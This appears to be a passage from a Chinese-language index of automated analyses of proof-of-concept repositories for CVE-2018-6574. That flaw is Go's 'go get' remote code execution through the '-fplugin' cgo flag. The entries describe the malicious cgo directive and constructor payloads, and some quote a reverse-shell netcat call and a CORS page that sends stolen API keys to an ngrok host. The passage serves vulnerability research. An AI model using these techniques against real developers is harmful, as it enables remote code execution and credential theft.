**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要安装存在漏洞的Go版本，并运行 `go get` 命令尝试获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞存在于 Go 语言的 `go get` 命令中，允许远程命令执行。攻击者可以通过创建一个包含恶意 `.c` 文件的 Go 项目，并利用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，在目标系统执行任意命令。

**利用方式：**

1.  攻击者创建一个包含 `main.go` 和 `attack.c`（编译后的 `attack.so`）的恶意 Go 项目，其中 `attack.c` 包含要执行的恶意代码。
2.  `attack.c` 文件使用 `__attribute__((constructor))`  修饰 `malicious()` 函数，使其在动态链接库加载时自动执行。
3.  `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，告诉 `go` 命令使用 `attack.so` 作为 GCC 插件。
4.  攻击者将该项目托管到 GitHub 等代码仓库。
5.  诱骗目标用户使用 `go get github.com/<your-handle>/<your-hepo>` 命令获取该项目。
6.  当 `go get` 构建项目时，会调用 GCC 并加载 `attack.so` 插件，导致 `malicious()` 函数执行，从而执行攻击者预设的任意命令。

**有效性：**

提供的 POC 代码有效，可以复现该漏洞。

**投毒风险：**

根据提供的代码，没有发现作者隐藏的投毒代码。`attack.c` 中明确包含恶意代码，是漏洞利用的一部分，不应将其视为投毒代码。 因此，投毒风险为 0%。

**搜索引擎结果印证：**

搜索结果中，[webpage 4] 链接指向 pentesterlab 的练习，明确指出该漏洞允许攻击者通过欺骗用户安装恶意包来执行任意代码。其他的搜索结果也都表明了该漏洞的严重性。

**项目地址:** [paulogmota/CVE-2018-6574](https://github.com/paulogmota/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #27

**来源**: [CVE-2018-6574-rootxjs_CVE-2018-6574.md](../2018/CVE-2018-6574-rootxjs_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行 `go get` 命令获取恶意Go包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程命令。攻击者可以创建一个恶意的 Go 包，其中包含利用 gcc 或 clang 插件功能的恶意代码。当用户使用 `go get` 获取并构建此恶意包时，Go 会执行攻击者插入的恶意代码。

**有效性：**
提供的 POC 代码演示了如何利用 `-fplugin` 选项。`main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，指示 Go 在编译时加载 `attack.so` 插件。如果 `attack.so` 包含恶意代码，它将在构建过程中执行。这个POC代码表明该漏洞可以被利用。

**投毒风险：**
代码中通过 `-fplugin=./attack.so` 引入外部so文件，如果该so文件不是由代码作者提供或来源不明，则存在投毒风险。虽然POC本身只是一个演示性质的例子，但是一旦被攻击者利用，替换`attack.so`，可能会导致用户在不知情的情况下运行恶意代码。投毒风险估计为10%，因为需要攻击者替换或控制`attack.so`文件。

**利用方式：**
1.  攻击者创建一个包含恶意 `attack.so` 文件的 Go 包。`attack.so` 文件包含攻击者想要执行的任意代码。
2.  攻击者将包含恶意 Go 包的仓库托管在公共服务器上。
3.  攻击者诱使用户使用 `go get` 命令获取此恶意包，例如 `go get github.com/attacker/evilpackage`。
4.  当用户运行 `go get` 命令时，Go 会下载并构建该包。由于 `main.go` 中包含 `#cgo CFLAGS: -fplugin=./attack.so` 指令，构建过程会加载并执行 `attack.so` 中的恶意代码。
5.  恶意代码在用户系统上执行，攻击者可以获得远程代码执行权限。

**项目地址:** [rootxjs/CVE-2018-6574](https://github.com/rootxjs/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #28

**来源**: [CVE-2018-6574-rootxjs_new-CVE-2018-6574.md](../2018/CVE-2018-6574-rootxjs_new-CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 需要目标机器运行受影响版本的 Go，并且使用 'go get' 命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在构建源代码期间，通过 'go get' 命令执行远程命令。这是因为受影响版本的 Go 没有阻止 `-fplugin=` 和 `-plugin=` 参数，这些参数可以被用来加载恶意的 gcc 或 clang 插件。提供的POC代码演示了如何利用此漏洞。它通过在 Go 代码中使用 `#cgo CFLAGS: -fplugin=./plugin.so` 指令来指定一个恶意的插件。当构建此代码时，go 会尝试加载 `./plugin.so`，这使得攻击者能够在目标机器上执行任意代码。根据POC代码内容分析，未发现作者隐藏的投毒代码。

**项目地址:** [rootxjs/new-CVE-2018-6574](https://github.com/rootxjs/new-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #29

**来源**: [CVE-2018-6574-seoqqq_CVE-2018-6574.md](../2018/CVE-2018-6574-seoqqq_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致系统完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 用户使用受影响的 Go 版本执行 `go get` 命令从恶意仓库获取代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者利用 `go get` 命令在构建源代码时执行任意命令。该漏洞源于 Go 在处理 gcc 或 clang 插件选项时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以通过创建一个包含恶意代码的 Go 包，并在该包中利用 CGO 特性，将恶意的编译器选项注入到构建过程中。当用户使用受影响的 Go 版本执行 `go get` 命令来获取并构建该恶意包时，恶意代码将被执行。

**有效性分析：**
提供的 PoC 代码看起来是有效的。`main.go` 文件使用了 CGO 指令 `#cgo CFLAGS: -fplugin=./attack.so`，这正是漏洞利用的关键。这个指令告诉 Go 编译器在构建过程中加载 `attack.so` 插件。`attack.c` 文件定义了一个 `exploit` 函数，该函数使用 `__attribute__((constructor))` 属性，确保在动态链接库加载时自动执行。因此，当 `go get` 命令构建包含 `main.go` 的包时，`attack.so` 会被加载，`exploit` 函数会被执行，从而实现任意命令执行。

**投毒风险分析：**
经过对提供的代码进行分析，没有发现明显的投毒代码。`aaa.c`、`attack.c` 和 `exploit.c` 都包含执行 `/usr/local/bin/score 4a0b3a0c-6593-4414-86ca-c78649e04c0f` 命令的代码或者执行`sleep 20`的代码。这些代码是PoC本身的一部分，旨在验证漏洞。`README.md`是对漏洞的描述说明，`main.go`是触发漏洞的主代码, 所以仓库中作者隐藏的投毒代码可能性为0%。

**利用方式总结：**
1.  **创建恶意 Go 包：** 攻击者创建一个包含 `main.go` 文件的 Go 包，并在 `main.go` 文件中使用 CGO 指令 `#cgo CFLAGS: -fplugin=./attack.so`，指向包含恶意代码的动态链接库。
2.  **创建恶意动态链接库：** 攻击者创建一个动态链接库（例如 `attack.so`），该库包含在加载时自动执行的恶意代码。
3.  **托管恶意包：** 攻击者将恶意 Go 包托管在一个可以通过 `go get` 命令访问的仓库中（例如 GitHub）。
4.  **诱导用户执行 `go get`：** 攻击者诱导用户使用受影响的 Go 版本执行 `go get <malicious_package_url>` 命令来获取并构建恶意包。
5.  **执行恶意代码：** 当用户执行 `go get` 命令时，Go 编译器会加载恶意动态链接库，并执行其中的恶意代码，从而实现远程命令执行。

**项目地址:** [seoqqq/CVE-2018-6574](https://github.com/seoqqq/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #30

**来源**: [CVE-2018-6574-solovvway_CVE-2018-6574.md](../2018/CVE-2018-6574-solovvway_CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 目标系统需要使用受影响的Go版本，攻击者需要能够让目标系统通过`go get`获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在构建 Go 项目时执行任意代码。该漏洞源于 `go get` 命令在处理 gcc 或 clang 插件选项时没有正确过滤 `-fplugin` 和 `-plugin` 参数。攻击者可以通过构造包含恶意 `// #cgo CFLAGS: -fplugin=./attack.so` 的 Go 代码，诱使受害者使用 `go get` 命令下载并构建该项目。构建过程中，会加载攻击者提供的恶意插件（attack.so），从而执行任意代码。

漏洞利用方式：

1.  攻击者创建一个包含恶意代码的 Go 项目。
2.  项目中的 Go 文件包含 `// #cgo CFLAGS: -fplugin=./attack.so` 这样的注释，指定加载恶意的插件。
3.  攻击者将项目托管在公开的代码仓库中。
4.  受害者使用 `go get` 命令获取该项目。
5.  `go get` 在构建项目时，会加载并执行攻击者提供的恶意插件。

根据提供的代码，`attack.c` 文件中定义了一个名为 `malicious` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score 91e025d6-94e9-4d26-8b86-c00dea0b3129`。这个命令看起来像是用于提交漏洞利用得分的，本身不包含恶意或投毒行为。`main.go` 文件则通过 cgo 技术，将 attack.so 文件编译为插件,并通过 // #cgo CFLAGS指定。

有效性：提供的POC代码有效，能实现远程代码执行。
投毒风险：在给定的代码中，没有发现明显的投毒行为。`attack.c` 中的 system 命令只是执行了一个特定的脚本，用于提交得分，没有发现进一步利用或危害系统的代码。



**项目地址:** [solovvway/CVE-2018-6574](https://github.com/solovvway/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #31

**来源**: [CVE-2018-6574-the-valluvarsploit_CVE-2018-6574.md](../2018/CVE-2018-6574-the-valluvarsploit_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的 Go 版本，且执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许在源码构建过程中利用 gcc 或 clang 插件特性执行远程命令。漏洞原因是 Go 在执行 `go get` 时没有正确阻止 `-fplugin=` 和 `-plugin=` 参数。 

**有效性:**

提供的 POC 代码有效。`attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `__attribute__((constructor))` 在程序启动时自动执行 `/usr/local/bin/score 5406e228-19be-4c56-b6da-ee36ce3dee1a` 命令。`main.go` 文件使用 `cgo` 调用 `attack.so` (由 `attack.c` 编译而来)，从而触发恶意代码执行。

**投毒风险:**

提供的代码中没有明显的投毒代码。`attack.c` 的功能很明确，就是执行一个固定的命令。`main.go` 只是为了触发 `attack.c` 中恶意函数的执行。因此，投毒风险评估为 0%。

**利用方式:**

1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包。
2.  `attack.c` 包含在程序启动时执行任意命令的代码。
3.  `main.go` 利用 `cgo` 技术，通过 `-fplugin=` 选项加载并执行 `attack.c` 编译后的共享库。
4.  攻击者将该恶意 Go 包托管在可访问的存储库中。
5.  受害者在易受攻击的 Go 版本上使用 `go get` 命令下载并构建该恶意包。
6.  构建过程中，`attack.so` 被加载，其中的恶意代码被执行，导致远程命令执行。
7.  `/usr/local/bin/score` 命令被执行，可能导致系统受损或被控制。

**项目地址:** [the-valluvarsploit/CVE-2018-6574](https://github.com/the-valluvarsploit/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #32

**来源**: [CVE-2018-6574-tjcim_cve-2018-6574.md](../2018/CVE-2018-6574-tjcim_cve-2018-6574.md)

## CVE-2018-6574-Go远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者需要使用存在漏洞的Go版本，并通过`go get`命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许在源代码构建期间执行远程命令。这是因为 Go 在处理 gcc 或 clang 插件功能时，未阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意代码的 Go 包，该代码利用这些参数在构建时执行任意命令。提供的 POC 代码通过创建一个共享对象 (`attack.so`)，其中包含一个在加载时执行 `sleep 10` 命令的构造函数。`main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，在构建时加载该共享对象，从而触发恶意代码的执行。漏洞利用方式是诱使用户使用易受攻击的 Go 版本 `go get` 命令下载并构建包含恶意 `#cgo` 指令的包。由于POC代码明确定义了执行的命令和利用方式，没有发现隐藏的恶意代码，因此投毒风险评估为0%。

**项目地址:** [tjcim/cve-2018-6574](https://github.com/tjcim/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #33

**来源**: [CVE-2018-6574-yavolo_CVE-2018-6574.md](../2018/CVE-2018-6574-yavolo_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 用户使用受影响版本的Go执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 漏洞允许攻击者在用户使用 `go get` 命令下载和构建包含恶意代码的Go包时，执行任意命令。该漏洞是由于 Go 在构建过程中没有正确阻止 `-fplugin=` 和 `-plugin=` 参数传递给 gcc 或 clang 编译器造成的。攻击者可以创建一个包含恶意 C 代码的 Go 包，并利用 `// #cgo CFLAGS:` 指令将恶意代码编译成共享库，然后在构建过程中执行。 

**有效性：** 提供的PoC代码是有效的。其中 `a.c` 文件包含恶意C代码，该代码在编译成动态链接库 (`a.so`) 后，会被 `main.go` 文件中的 `// #cgo CFLAGS: -fplugin=./a.so` 指令加载并在构建过程中执行。`a.c` 中的代码 `system("/usr/local/bin/score 6c9d4862-4326-403c-a1c6-47a2ad6fcda5");` 会执行任意系统命令。

**投毒风险：** 此处 `a.c` 中执行 `system("/usr/local/bin/score 6c9d4862-4326-403c-a1c6-47a2ad6fcda5");` 可以视作 PoC的一部分，用于证明漏洞存在，但同时也存在一定的投毒风险。开发者可能隐藏其他恶意代码，例如窃取用户凭据或安装后门。由于`score`命令指向位置未知,可能存在更大的风险.

**利用方式：**

1.  **创建恶意Go包：** 攻击者创建一个包含 `a.c` 和 `main.go` 文件的恶意Go包。
2.  **植入恶意C代码：** 在 `a.c` 文件中编写要执行的恶意C代码。PoC中为执行特定的命令。
3.  **CGO指令：** 在 `main.go` 文件中使用 `// #cgo CFLAGS: -fplugin=./a.so` 指令，指示 Go 编译器在构建过程中加载并执行恶意共享库。
4.  **诱骗用户安装：** 攻击者将恶意Go包上传到公共代码仓库或通过其他方式诱骗用户使用 `go get` 命令下载和构建该包。
5.  **执行恶意代码：** 当用户使用 `go get` 命令构建恶意包时，恶意C代码将被编译成共享库并执行，从而导致远程命令执行。

**项目地址:** [yavolo/CVE-2018-6574](https://github.com/yavolo/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #34

**来源**: [CVE-2018-6574-zerbaliy3v_cve-2018-6574-exploit.md](../2018/CVE-2018-6574-zerbaliy3v_cve-2018-6574-exploit.md)

# CVE-2018-6574

> 📦 该CVE有 **34** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-6574-AshrSec_pentesterlab-CVE-2018-6574.md](../2018/CVE-2018-6574-AshrSec_pentesterlab-CVE-2018-6574.md)

## CVE-2018-6574-Go远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要安装受影响版本的Go，并且执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞存在于Go语言的`go get`命令中，允许远程命令执行。当使用`go get`构建包含恶意代码的Go项目时，攻击者可以利用gcc或clang插件功能，通过`-fplugin=`或`-plugin=`参数执行任意命令。提供的PoC代码包含一个C文件（`exploit.c`）和一个Go文件（`main.go`）。

`exploit.c` 文件定义了一个在加载时自动执行的 `malicious` 函数。这个函数调用 `system` 函数执行 `/usr/local/bin/score 2c03d8c2-7038-402d-ae28-03a4d2ed9f42` 命令。这个命令是用于上报漏洞利用成功的信息，是测试环境常用的方法。所以这里的投毒风险很低。

`main.go` 文件通过 cgo 技术，允许 Go 代码调用 C 代码。 `#cgo CFLAGS: -fplugin=./exploit.so`  这行代码指示编译器将 `exploit.so` 作为 gcc/clang 插件加载，从而执行 `exploit.c` 中的恶意代码。

利用方式如下：
1.  攻击者创建一个包含恶意 `exploit.c` 和 `main.go` 的Go项目。
2.  攻击者将该项目托管到公共代码仓库。
3.  受害者在安装了受影响Go版本的机器上使用 `go get <攻击者项目>` 命令。
4.  `go get` 在构建项目时，会加载 `exploit.so` 插件，从而执行 `exploit.c` 中的恶意代码。

结论：该PoC代码有效，可以用于验证CVE-2018-6574漏洞。代码本身没有明显的隐藏投毒代码的迹象。

**项目地址:** [AshrSec/pentesterlab-CVE-2018-6574](https://github.com/AshrSec/pentesterlab-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #2

**来源**: [CVE-2018-6574-Cypheer_exploit_CVE-2018-6574.md](../2018/CVE-2018-6574-Cypheer_exploit_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的go版本执行`go get`命令获取恶意模块

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程命令。攻击者可以通过在恶意Go模块中，利用 gcc 或 clang 的 plugin 特性，在构建时执行任意代码。`main.go` 包含 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，这会指示 go 编译器加载并执行 `exploit.so` 作为插件。如果该`.so`文件包含恶意代码，它将在构建过程中被执行。提供的`CORS.html`文件尝试利用CORS漏洞从`http://api-ptl-fbafd824-4fabf863.libcurl.so/api/v1/keys`获取敏感信息，然后将信息发送到攻击者的服务器`https://09ef-186-141-133-245.sa.ngrok.io`。这种组合表明漏洞利用可能涉及到引诱用户下载包含恶意`exploit.so`文件的Go模块，并在构建时执行恶意代码，同时利用CORS漏洞窃取其他域的数据。

**有效性：** `main.go`中的`-fplugin`标志结合`exploit.so`的潜在恶意性，使得该漏洞利用具有有效性。`CORS.html` 的存在表明攻击者可能试图结合利用其他漏洞。

**投毒风险：** 投毒风险为10%。虽然主要的攻击向量看起来是利用`go get`的远程代码执行漏洞，`CORS.html`的存在提出了可能的其他恶意目的。`CORS.html`本身不直接与go编译器或`-fplugin`漏洞相关，因此将其视为完全独立的投毒行为是合理的。 然而，如果恶意作者试图通过其他途径使用该POC，那么使用CORS代码有风险。`main.go`中的核心漏洞利用机制更直接且易于理解。

**利用方式：**

1.  **创建恶意的Go模块：** 攻击者创建一个包含恶意 `exploit.so` 文件的Go模块，该文件将在编译时执行恶意代码。
2.  **利用 `-fplugin` 标志：** 在Go代码中使用 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，指示编译器加载恶意插件。
3.  **诱导受害者 `go get`：** 攻击者诱骗受害者使用 `go get` 命令获取该恶意模块。
4.  **代码执行：** 当受害者构建恶意模块时，`exploit.so` 中的代码将被执行。
5. **结合CORS攻击 (可选):** CORS.html 是可选的攻击辅助，旨在获取其他域的敏感数据。但这需要目标API存在CORS配置错误。
综上，该漏洞的利用方式是结合了`go get`的远程代码执行漏洞和潜在的CORS漏洞，旨在实现远程代码执行和数据窃取。

**项目地址:** [Cypheer/exploit_CVE-2018-6574](https://github.com/Cypheer/exploit_CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #3

**来源**: [CVE-2018-6574-Dannners_CVE-2018-6574-go-get-RCE.md](../2018/CVE-2018-6574-Dannners_CVE-2018-6574-go-get-RCE.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用存在漏洞的Go版本，且使用`go get`命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-6574漏洞允许攻击者在受害者构建源代码时执行任意命令。漏洞根源在于`go get`命令没有正确过滤`-fplugin`和`-plugin`参数，导致可以加载恶意的gcc或clang插件。攻击者可以通过创建一个包含恶意插件的Go包，并诱使受害者使用`go get`命令获取该包来触发漏洞。

**有效性：**
根据提供的漏洞信息和搜索引擎结果，该漏洞确实存在，并且有公开的PoC。

**投毒风险：**
提供的PoC代码本身只是一个简单的示例，用于证明漏洞的存在。它通过CGO调用`printf`函数打印一段文字。代码中使用了`-fplugin=./plugin.so`，这意味着需要同时存在一个名为`plugin.so`的恶意插件才能实现远程命令执行。虽然提供的代码本身不包含恶意行为，但是如果攻击者创建一个包含更复杂恶意逻辑的`plugin.so`，则可能造成严重危害。因此，存在一定的投毒风险。

对仓库投毒风险评估：此代码本身无明显风险，风险点在于配套的plugin.so文件，如果plugin.so存在恶意代码，则存在远程代码执行的风险，因为plugin.so不在代码中，需要依赖外部提供，作者可以在plugin.so加入任意代码，风险最高，因此投毒风险为5%。

**利用方式：**
1.  攻击者创建一个包含恶意gcc或clang插件（`plugin.so`）的Go包。
2.  该插件会在编译时执行攻击者预设的命令。
3.  攻击者将该恶意Go包托管在公开的代码仓库（例如GitHub）或私有服务器上。
4.  攻击者诱使受害者使用`go get`命令获取该恶意Go包。
5.  当受害者构建该Go包时，恶意插件会被加载并执行，从而实现远程命令执行。

根据 pentesterlab 网站的描述，通过托管恶意包诱导用户安装是主要的利用方式。

**项目地址:** [Dannners/CVE-2018-6574-go-get-RCE](https://github.com/Dannners/CVE-2018-6574-go-get-RCE)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #4

**来源**: [CVE-2018-6574-NsByte_CVE-2018-6574.md](../2018/CVE-2018-6574-NsByte_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，并且执行了 `go get` 命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令在目标系统上执行任意代码。此漏洞源于 Go 在构建源代码期间没有充分阻止 `gcc` 或 `clang` 插件的 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意 `attack.c` 文件和相应的 `main.go` 文件的 Go 包。`attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `__attribute__((constructor))` 标记，使其在共享库加载时自动执行。在这个 POC 中，`malicious()` 函数尝试建立一个反向shell (`nc blablabla`)。`main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，指示 Go 编译器在构建过程中加载 `attack.so` 共享库。当用户使用易受攻击的 Go 版本执行 `go get` 命令获取此恶意包时，`attack.so` 会被加载，并且 `malicious()` 函数会被执行，从而导致远程命令执行。

**有效性:** 提供的 POC 代码有效，它展示了如何通过 `go get` 和 `gcc` 插件在目标系统上执行任意命令。`attack.c` 文件中的 `system("nc blablabla")` 会尝试建立反向 shell，从而验证了远程代码执行的可能性。

**投毒风险:** 此代码仓库中没有明显的投毒代码。`attack.c` 中执行反向 shell 的代码是漏洞利用的核心部分，而不是隐藏的恶意行为。该利用方式的意图明确，且目的在于利用CVE-2018-6574。

**利用方式:** 攻击者需要创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包，并将其托管在可公开访问的存储库中。然后，诱使目标用户使用易受攻击的 Go 版本执行 `go get` 命令来获取此恶意包。当 `go get` 执行时，Go 编译器会加载 `attack.so` 共享库，并执行其中的恶意代码，从而导致远程命令执行。攻击者可以通过修改 `attack.c` 文件中的命令来执行任意操作，例如安装后门、窃取数据或控制整个系统。

**项目地址:** [NsByte/CVE-2018-6574](https://github.com/NsByte/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #5

**来源**: [CVE-2018-6574-Saboor-Hakimi_CVE-2018-6574.md](../2018/CVE-2018-6574-Saboor-Hakimi_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本执行 `go get` 命令拉取恶意代码

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过构造包含恶意 `// #cgo CFLAGS: -fplugin=` 指令的 Go 代码，在受害者使用 `go get` 命令拉取并构建该代码时，利用 gcc 或 clang 插件功能执行任意命令。

**有效性：**
提供的 PoC 代码是有效的。`attack.c` 文件包含一个在程序加载时执行 `system()` 函数的恶意函数，该函数会执行 `/usr/local/bin/score a96ec182-5326-4191-9570-5d5c3fe248a8` 命令。`main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建过程中加载 `attack.so` 插件，从而触发恶意代码的执行。

**投毒风险：**
经过分析，此 PoC 本身并不包含隐藏的投毒代码。`/usr/local/bin/score` 命令的功能未知，但如果该路径指向攻击者控制的服务器，可以构成数据回传或者其他恶意行为。不过单从提供的代码来看，其目的仅仅是利用漏洞触发执行任意命令，而非在代码中植入后门或其他形式的恶意代码。因此，投毒风险评估为 0%。

**利用方式：**
1.  攻击者创建一个包含恶意 `// #cgo CFLAGS: -fplugin=` 指令的 Go 包，并将该包托管在公开的代码仓库中。
2.  受害者使用存在漏洞的 Go 版本执行 `go get` 命令拉取该恶意包。
3.  `go get` 命令会自动构建该包，此时 Go 编译器会加载攻击者指定的恶意插件。
4.  恶意插件中的代码被执行，导致攻击者可以在受害者机器上执行任意命令。

**项目地址:** [Saboor-Hakimi/CVE-2018-6574](https://github.com/Saboor-Hakimi/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #6

**来源**: [CVE-2018-6574-YoussefSalama1_CVE-2018-6574.md](../2018/CVE-2018-6574-YoussefSalama1_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 受害者需要使用存在漏洞的Go版本执行 `go get` 命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Go语言的`go get`命令中，由于在编译过程中没有正确过滤`-fplugin`和`-plugin`参数，导致攻击者可以通过构造包含恶意插件的Go代码仓库，诱使受害者使用存在漏洞的Go版本执行`go get`命令时，执行任意命令。

**有效性分析：**
提供的POC代码展示了如何使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定一个插件。当使用存在漏洞的Go版本编译该代码时，`attack.so`会被加载，其中的代码会被执行，从而实现远程代码执行。

**投毒风险分析：**
